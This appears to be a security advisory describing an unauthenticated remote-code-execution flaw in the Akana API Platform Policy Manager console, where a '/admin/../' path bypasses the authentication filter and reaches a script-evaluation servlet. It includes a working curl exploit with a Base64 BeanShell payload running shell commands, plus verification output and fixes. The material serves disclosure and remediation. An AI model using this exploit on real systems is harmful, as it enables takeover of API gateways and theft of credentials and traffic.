# Akana API Platform 8.4.29 — Path-Normalization Filter/Dispatcher Discrepancy → Unauthenticated RCE

## 1. Overview

Akana API Platform is a closed-source API management product whose Policy Manager (PM) console runs on an OSGi runtime (Apache Felix) with servlets registered via OSGi Spring DM into an embedded Jetty 7.6.10.v20130312 container. Authentication is enforced by a filter chain defined in `console-filters.xml`; the only mandatory gate is `SessionValidatorFilter` (com.soa.common.console). The filter's exception logic (`isExceptionalCase`) matches exempt paths against `request.getRequestURI()` — the client's raw, un-normalized URI — while Jetty normalizes `..` before servlet dispatch. An attacker requests `/admin/../ext/scriptTestServ`: the filter sees a path starting with `/admin/`, matches the exempt `/admin/*` pattern, and skips authentication; Jetty normalizes the request to `/ext/scriptTestServ`, which routes to the protected `ScriptTestServlet` (`console-core.xml:340-347`, pathSpec `/ext/scriptTestServ`).

`ScriptTestServlet` decodes a Base64 `script` request parameter and evaluates it via the attacker-chosen script engine (`js` → Nashorn, `python` → Jython 2.7.1, `beanshell` → BeanShell 2.1.8), reaching `engine.eval()` with zero sanitization. The result is unauthenticated remote code execution as the container's default `akanaAdmin` user. Verified end-to-end: the direct path `/ext/scriptTestServ` is blocked (HTTP 200 login redirect, no command executed), while the bypass path returns `success: true` and executes the command (`uid=999(akanaAdmin)` marker).

## 2. Vulnerability Summary

- **Type**: Unauthenticated RCE via path-normalization filter/dispatcher discrepancy (CWE-287/CWE-863)
- **Root cause 1 (CWE-287)**: `SessionValidatorFilter.isExceptionalCase` makes the authentication decision on the raw `getRequestURI()` (un-normalized, un-decoded), matching the wildcard exempt path `/admin/*`
- **Root cause 2 (CWE-863)**: the embedded Jetty router normalizes `..` before dispatch, so `/admin/../ext/scriptTestServ` routes to a protected servlet
- **Root cause 3 (CWE-94)**: `ScriptTestServlet` reaches `engine.eval()` with fully attacker-controlled script content and engine choice; no in-servlet authentication or script sandbox
- **Result**: unauthenticated remote code execution as `akanaAdmin`. CVSS 9.8.

## 3. Authentication Boundary

The PM console filter chain (`console-filters.xml`) runs `ParameterToSessionPersisterFilter → ParameterFilter (struts) → RequestAttributesFilter → SessionValidatorFilter → ...`. The first three filters do not normalize or reject `..` (ParameterToSessionPersisterFilter and RequestAttributesFilter have no path handling; ParameterFilter only regex-matches parameter names). `SessionValidatorFilter` iterates validators (default `DefaultSessionValidator`), which hard-requires a session with the `pmsubject` attribute — no SAML or forgery bypass — and then consults `isExceptionalCase` for exempt paths.

The exempt (`exceptionalPaths`) list includes `/rest`, `/xmlmapper`, `/admin`, `/admin/*`, `/atmosphere`, `/atmosphere/*`, `/widgets/*`, `/ms/login.do`, and others. `RelativeURIPatternMatcher.match(requestPath, "/admin/*")` computes `path="/admin/"`, `extension=""`, `exactMatch=false`, and returns true when `requestPath.startsWith("/admin/")` — because `remainPath.endsWith("")` is always true. Since the raw request URI `/admin/../ext/scriptTestServ` starts with `/admin/`, the filter treats the request as exempt.

Notably, `SessionValidatorFilter`'s own pathSpec does not include `/admin/*` (it covers `/ext/*, /viewWsdl/*, /am/*, ...`). Whichever path the OSGi filter selection uses, the request bypasses authentication: with canonical-path selection, the filter applies (pathSpec `/ext/*` matches) and then `isExceptionalCase` matches the raw `/admin/..` path; with raw-path selection, the filter does not apply at all.

## 4. Attack Surface

- **Entry**: HTTP GET/POST to `/{pmcontext}/admin/../ext/scriptTestServ`
- **Controllable parameters**: `script` (Base64-encoded arbitrary code), `language` (`js`/`python`/`beanshell`), `action=testScript`
- **No prerequisites**: default configuration; the console feature `policy.manager.console=true` registers the servlet; all three script engines are registered by default via OSGi `META-INF/services/javax.script.ScriptEngineFactory`
- **Privilege**: executes as the container default user `akanaAdmin` (uid 999)

## 5. Sink Identification

`DefaultExpressionHandler.testExpression` (com.soa.console.script.function.impl):

```java
// line 74
ScriptEngine engine = scriptEngineManager.getEngineByName(scriptEngine);
engine.put("logger", logger);
engine.put("registry", registry);
engine.put("message", message);
engine.put("context", context);
engine.put("util", util);
engine.eval(script);   // ← script = Base64-decoded raw user input, zero sanitization
```

Both `script` and `scriptEngine` are parameters, fully user-controlled. `SUPPORTED_ENGINES = {"js", "python", "beanshell"}` (ScriptEngineManagerImpl): `js` → Nashorn (JRE 1.8.0_144), `python` → Jython 2.7.1 (jython-standalone-2.7.1.jar), `beanshell` → BeanShell 2.1.8 (`bsh.BshScriptEngineFactory`). All three are full code-execution engines with no allowlist or sandbox.

The HTTP entry (`ScriptTestServlet.doGet/doPost`):

```java
String script = Base64.decode(request.getParameter("script"));
String language = request.getParameter("language");
String action = request.getParameter("action");
if ("testScript".equals(action)) {
    new TestScriptCommand().setScript(script).setScriptEngine(language).doExecute();
    // → DefaultExpressionHandler.testExpression(language, script) → engine.eval(script)
}
```

The servlet performs no authentication check of its own.

## 6. Source Identification & Controllability

The source is the HTTP request parameters: `script` (Base64) and `language` (engine choice) plus `action=testScript`. Everything flowing into `engine.eval()` — code content and engine — is attacker-controlled; the only transformation is Base64 decoding. The path itself (the `..` sequence) is also attacker-controlled and is the entire authentication-bypass primitive.

## 7. Data Flow

```
HTTP GET /admin/../ext/scriptTestServ?action=testScript&language=beanshell&script=<base64>
  │
  ├─ SessionValidatorFilter.doFilter (pathSpec /ext/*)
  │    └─ isExceptionalCase(request):
  │         requestPath = httpReq.getRequestURI()   // raw: /admin/../ext/scriptTestServ
  │         RelativeURIPatternMatcher.match(requestPath, "/admin/*")
  │           → startsWith("/admin/") = true → exempt → chain.doFilter (auth bypass)
  │
  └─ Jetty 7.6.10 servlet routing
       └─ normalizes ".." → /ext/scriptTestServ
       └─ routes to ScriptTestServlet (pathSpec /ext/scriptTestServ)
       └─ ScriptTestServlet.doGet
            └─ script = Base64.decode(param)   // user-controlled
            └─ language = param                // user-controlled
            └─ action=testScript
            └─ TestScriptCommand.doExecute
                 └─ DefaultExpressionHandler.testExpression(language, script)
                      └─ engine = mgr.getEngineByName("beanshell")  // BeanShell 2.1.8
                      └─ engine.eval(script)   // arbitrary code execution
                           └─ Runtime.getRuntime().exec(...)
```

## 8. Exploit Construction

The most reliable engine is BeanShell (pure Java syntax):

```bash
PAYLOAD='Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id > /tmp/akana_rce_marker"});'
BSH=$(printf "%s" "$PAYLOAD" | base64 | tr -d "\n")
curl -s -w "\nHTTP:%{http_code}\n" \
  "http://<host>:9900/admin/../ext/scriptTestServ?action=testScript&language=beanshell&script=$BSH"
# → success: true  HTTP:200
cat /tmp/akana_rce_marker   # → uid=999(akanaAdmin) ...
```

Jython (`language=python`) uses Java interop (`from java.lang import Runtime`) because the `os` module is unavailable in standalone Jython; Nashorn (`language=js`) uses `java.lang.reflect.Array` to build the `String[]` argument for `Runtime.getRuntime().exec`.

## 9. Dynamic Verification

Control test (direct path must be blocked):

```
GET /ext/scriptTestServ?action=testScript&language=beanshell&script=<cmd>
→ HTTP:200 (login-redirect HTML; SessionValidatorFilter intercepts)
→ /tmp/direct_marker = NONE (command NOT executed)
```

Bypass test (RCE achieved):

```
GET /admin/../ext/scriptTestServ?action=testScript&language=beanshell&script=<cmd>
→ success: true  HTTP:200 (ScriptTestServlet handled normally, not auth-intercepted)
→ /tmp/akana_rce_marker = uid=999(akanaAdmin) gid=998(akanaAdmin) groups=998(akanaAdmin)
```

The bypass response `success: true` proves the servlet executed (not an auth redirect), and the marker proves command execution in the container as `akanaAdmin`. The direct path produced no marker, confirming the auth gate is effective against the canonical path and only the normalization bypass defeats it.

## 10. Reachability & Impact

- **Reachability**: the PM console listens on the HTTP port (in production usually reverse-proxied to 443); the attacker needs only network access to the console. No credentials, no configuration, no prior foothold.
- **Impact**: unauthenticated code execution as `akanaAdmin` inside the API platform container — API gateway policies, credentials, proxied traffic, and the management plane all become accessible. In API-management deployments this is the central trust anchor for the organization's API traffic.
- **Scope**: default Akana API Platform 8.x Policy Manager console deployments.

## 11. Fix Recommendations

1. Make `SessionValidatorFilter.isExceptionalCase` decide on the normalized path (`getServletPath()`) instead of raw `getRequestURI()`, aligning filter and dispatcher path views
2. Add a leading normalization filter that rejects `..` and encoded variants (`%2e%2e`, `%2e./`, `.%2e`, backslashes)
3. Add an authentication check inside `ScriptTestServlet` (do not rely solely on the filter chain), and restrict the `ScriptEngine` (block `Runtime`/`ProcessBuilder`/`import`)
4. Narrow the `/admin/*` exempt pattern to exact login paths to avoid the always-true `endsWith("")` match
5. Remove or gate the script-test endpoint in production

## 12. CWE & CVSS

- **CWE-287**: Improper Authentication — authentication decision made on un-normalized path
- **CWE-863**: Incorrect Authorization — exempt-path match lets a protected servlet be reached
- **CWE-94**: Improper Control of Generation of Code — attacker-controlled `engine.eval()`
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
